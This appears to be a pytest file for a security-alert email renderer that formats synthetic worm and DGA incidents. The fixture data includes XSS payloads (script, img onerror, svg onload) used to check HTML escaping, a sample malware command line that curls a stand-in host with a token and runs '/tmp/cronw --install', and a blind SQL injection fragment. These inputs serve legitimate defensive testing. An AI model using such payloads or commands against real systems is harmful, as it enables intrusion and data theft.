"""Readable owner mail and strict send boundary; every device/SMTP is synthetic."""
import json

import pytest

from flocks.monitoring.adapter import normalize
from flocks.monitoring.event_details import build_story
from flocks.monitoring.mail_template import display_time, render_notification
from flocks.monitoring import mailflow as m
from flocks.monitoring.investigation import fingerprint
from flocks.monitoring.store import encode, rows, write
from test_automatic import auto, Recorder, writes


def sample():
    raw = {'uuId': 'incident-d403de0f-2cc1-44c8-9648-fa67792f983c', 'name': '主机存在感染蠕虫病毒（DGA）',
           'hostIp': '10.32.1.173', 'incidentSeverity': 3, 'dealStatus': 0,
           'startTime': 1791860076, 'endTime': 1791860304}
    event = normalize('fixture-xdr', raw)
    event['device_name'] = '股份 XDR'
    evidence = [{'id': 'evidence-2', 'source_name': '股份 XDR', 'kind': 'alerts', 'success': True,
                 'facts': {'data': {'item': [{'alertId': 'alert-ef05bbee-0056-4934-ab83-ec1791860330',
                    'name': '访问大量随机域名', 'dataSource': 'NDR', 'alertTime': '2026-10-13T02:59:50Z',
                    'srcIp': '10.32.1.173', 'dstIp': '223.5.5.5', 'dstPort': 53, 'gptResult': 120}]}}}]
    conclusion = ('[evidence-2] 事件 incident-d403de0f-2cc1-44c8-9648-fa67792f983c：'
                  '主机向公共 DNS 发起大量随机域名查询，实际通信与恶意域名行为证据一致，确认存在安全风险。'
                  'gptResult=120，attackState=3。')
    story = build_story(event, evidence, {'verdict': 'risk', 'reason': conclusion,
                                        'gaps': ['缺少具体蠕虫变种信息，处置时应定位恶意样本。'],
                                        'evidence_ids': ['evidence-2']})
    return event, story


def test_operator_mail_focuses_on_action_and_facts_instead_of_identifiers():
    event, story = sample()
    message = render_notification(event, story, '连卓然')
    assert all(label in message.text for label in ('调查结论', '基本信息', '关键证据', '事件经过', '请您处理'))
    assert '10.32.1.173' in message.subject and '股份 XDR' in message.subject
    assert event['id'] not in message.subject
    assert message.text.count(event['id']) == 1 and message.html.count(event['id']) == 1
    assert '风险等级：高危' in message.text
    for noise in ('evidence-', 'alert-', 'gptResult', 'attackState', '来源原值', '设备编号', '发信前状态复核', '通知编号'):
        assert noise not in message.text and noise not in message.html
    assert '223.5.5.5' in message.text and '目的端口 53' in message.text
    assert '2026-10-13 10:59:50（北京时间）' in message.text
    assert '具体蠕虫变种' in message.text and '请直接回复本邮件' in message.text
    assert len(message.text) < 2600


def test_html_never_executes_or_imports_untrusted_fact_markup():
    event, story = sample()
    event['name'] = '事件<script>alert(1)</script>'
    story['conclusion'] = '<img src=x onerror="fetch(\'private\')">已确认异常。'
    story['timeline'].append({'time': '2026-10-13T03:00:00Z', 'text': '<iframe src="evil">', 'evidence_id': 'evidence-99'})
    message = render_notification(event, story, '<svg onload=alert(1)>')
    assert '<script>' not in message.html and '<img ' not in message.html and '<iframe ' not in message.html
    assert '&lt;script&gt;' in message.html and '&lt;img' in message.html and '&lt;iframe' in message.html
    assert 'href=' not in message.html and 'src=' not in message.html.replace('&lt;img src=', '').replace('&lt;iframe src=', '')


def test_missing_source_times_are_not_replaced_with_query_time():
    event, story = sample()
    event['startTime'], event['endTime'], event['basics'] = None, None, {}
    story['basics'] = {}
    story['timeline'] = []
    story['alert_details'] = []
    message = render_notification(event, story, '值班')
    assert '发生时间：来源未提供' in message.text
    assert '来源未提供可还原的详细发生时间' in message.text
    assert display_time('2026-10-13 10:59:50') == '2026-10-13 10:59:50（来源时间）'
    assert display_time(None) == '' and display_time(False) == ''
    assert display_time(1791860390000) == display_time('2026-10-13T02:59:50Z')


async def investigation(auto, *, verdict='risk', confidence='high', risk_confirmed=True, gaps=None, state='ready', facts=None):
    event = auto.event
    proof = {'id': 'evidence-1', 'event': event['id'], 'event_revision': fingerprint(event), 'success': True,
             'facts': facts or {'srcIp': '192.0.2.10', 'dstIp': '198.51.100.10', 'dstPort': 443}, 'kind': 'alerts'}
    result = {'verdict': verdict, 'confidence': confidence, 'risk_confirmed': risk_confirmed,
              'blocking_gaps': gaps or [], 'reason': '已确认该主机存在恶意外联活动，需核查处置。',
              'evidence_ids': ['evidence-1']}
    event['story'] = build_story(event, [proof], result)
    await write('INSERT INTO monitor_investigations(owner,project,event_key,event,evidence,result,state,updated_at) '
                'VALUES(?,?,?,?,?,?,?,?) ON CONFLICT(owner,project,event_key) DO UPDATE SET event=excluded.event,'
                'evidence=excluded.evidence,result=excluded.result,state=excluded.state',
                ('owner', auto.policy.project, event['key'], encode(event), encode([proof]), encode(result), state, '2026-10-13T00:00:00Z'))


@pytest.mark.parametrize('change', [dict(verdict='unknown'), dict(verdict='benign'), dict(confidence='medium'),
                                  dict(risk_confirmed=False), dict(state='deferred'), dict(gaps=['缺少证实攻击的报文'])])
async def test_unconfirmed_or_benign_events_are_recorded_without_mail_intents(auto, change):
    await investigation(auto, **change)
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    assert await rows('SELECT * FROM monitor_mail_notices') == []
    auto.send.assert_not_awaited()
    assert not writes(auto)


async def test_confirmed_risk_sends_one_html_notice_without_duplicate_entity_queries(auto):
    await investigation(auto)
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    notices = await rows('SELECT * FROM monitor_mail_notices')
    assert len(notices) == 1 and notices[0]['state'] == 'sent'
    assert [call['action'] for call in auto.calls] == ['list']
    assert not writes(auto) and auto.send.await_count == 1
    event = json.loads(notices[0]['event'])
    assert event['mail_presentation']['version'] == 1 and '<html' in event['mail_presentation']['html_body']
    assert 'fixture' in notices[0]['subject'] and '事件编号：event' in notices[0]['body']


async def test_fresh_activity_invalidates_old_result_then_reanalysis_can_send(auto):
    await investigation(auto)
    old_end = auto.raw['endTime']
    auto.raw['endTime'] += 1
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    notice = (await rows('SELECT * FROM monitor_mail_notices'))[0]
    assert notice['state'] == 'skipped' and not notice['body']
    auto.send.assert_not_awaited()
    auto.event = normalize('device', auto.raw)
    await investigation(auto)
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    current = (await rows('SELECT * FROM monitor_mail_notices'))[0]
    assert current['id'] == notice['id'] and current['state'] == 'sent'
    assert auto.send.await_count == 1
    assert json.loads(current['event'])['endTime'] == old_end + 1


async def test_unsupported_source_labels_cannot_trigger_notification(auto):
    await investigation(auto, facts={'hostIp': '192.0.2.10', 'attackState': 3, 'gptResult': 120})
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    auto.send.assert_not_awaited()
    assert not await rows('SELECT * FROM monitor_mail_notices')


async def test_unsent_incomplete_event_can_later_be_confirmed_and_send(auto):
    await investigation(auto, confidence='low')
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    assert not await rows('SELECT * FROM monitor_mail_notices')
    await investigation(auto)
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    assert auto.send.await_count == 1


async def test_queue_intent_uses_latest_verified_evidence_instead_of_old_story(auto):
    await investigation(auto)
    await m.queue_notices(auto.policy, [auto.event], auto.session.id)
    queued = (await rows('SELECT * FROM monitor_mail_notices'))[0]
    auto.raw['endTime'] += 1
    auto.event = normalize('device', auto.raw)
    await investigation(auto)
    case = (await rows('SELECT * FROM monitor_investigations'))[0]
    result = json.loads(case['result'])
    result['reason'] = '最新一轮发现新的恶意通信，需要立即核查。'
    await write('UPDATE monitor_investigations SET result=?', (encode(result),))
    assert await m.notify_one(auto.policy, queued, auto.session.id, auto.adapter) == 'sent'
    sent = (await rows('SELECT * FROM monitor_mail_notices'))[0]
    assert '最新一轮发现新的恶意通信' in sent['body']
    assert '已确认该主机存在恶意外联活动' not in sent['body']
    assert json.loads(sent['event'])['notified_end_time'] == auto.raw['endTime']
    assert auto.send.await_count == 1


def test_entity_only_process_evidence_keeps_command_and_explains_its_use_without_inventing_time():
    event, _ = sample()
    facts = {'data': {'item': [{'fileName': 'cronw', 'filePath': '/tmp/cronw',
        'virusName': 'Synthetic.Worm', 'processName': 'cronw',
        'commandLine': 'bash -c "curl https://example.invalid/payload?token=PRIVATE_TOKEN; /tmp/cronw --install"',
        'attackState': 3, 'stage': 60}]}}
    story = build_story(event, [{'id': 'evidence-5', 'kind': 'process', 'success': True,
                                'retrieved_at': '2026-10-13T06:00:00Z', 'facts': facts}],
                        {'verdict': 'risk', 'reason': '发现恶意进程及持久化行为，需要清理。'})
    message = render_notification(event, story, '责任人')
    evidence = message.text.split('关键证据\n', 1)[1].split('\n\n事件经过', 1)[0]
    assert '来源记录文件「cronw」，位置为「/tmp/cronw」' in evidence
    assert '来源将其识别为「Synthetic.Worm」' in evidence
    assert '来源记录进程「cronw」' in evidence
    assert '实际命令行为「bash -c "curl https://example.invalid/payload?token=[已脱敏]; /tmp/cronw --install"」' in evidence
    assert '定位待核查样本' in evidence and '核查启动方式' in evidence
    assert evidence.count('发生时间不详（来源未提供）') == 2
    assert all(noise not in evidence for noise in ('2026-', 'evidence-', '来源阶段值', 'attackState', '来源原值', 'PRIVATE_TOKEN'))
    assert 'PRIVATE_TOKEN' not in message.html and '&quot;curl ' in message.html


def test_file_creation_time_does_not_become_process_execution_time():
    event, _ = sample()
    facts = {'data': {'item': [{'fileName': 'worm.exe', 'filePath': '/tmp/worm.exe',
        'virusName': 'Synthetic.Worm', 'fileCreateTime': '2026-10-12T08:00:00Z',
        'processName': 'worm.exe', 'commandLine': '/tmp/worm.exe --persist'}]}}
    story = build_story(event, [{'id': 'evidence-6', 'kind': 'file', 'success': True, 'facts': facts}],
                        {'verdict': 'risk', 'reason': '已确认恶意文件活动。'})
    message = render_notification(event, story)
    evidence = message.text.split('关键证据\n', 1)[1].split('\n\n事件经过', 1)[0]
    assert '文件创建于 2026-10-12 16:00:00（北京时间）' in evidence
    assert '- 发生时间不详（来源未提供）：来源记录进程「worm.exe」' in evidence
    assert '/tmp/worm.exe --persist' in evidence


def test_explicit_evidence_timestamp_and_request_fragment_are_preserved():
    event, story = sample()
    story['alert_details'] = []
    story['key_evidence'] = [{
        'evidence_id': 'evidence-9', 'event_time': '2026-10-13T03:04:05Z',
        'text': '请求中存在需核对的 SQL 可疑片段：orderBy=case when @@version like 0x382e then name end',
    }]
    message = render_notification(event, story)
    evidence = message.text.split('关键证据\n', 1)[1].split('\n\n事件经过', 1)[0]
    assert '2026-10-13 11:04:05（北京时间）' in evidence
    assert '请求中出现片段「orderBy=case when @@version like 0x382e then name end」' in evidence
    assert '定位对应访问日志' in evidence and '不单独据此认定利用成功' in evidence
    assert '来源未提供' not in evidence and 'evidence-9' not in evidence
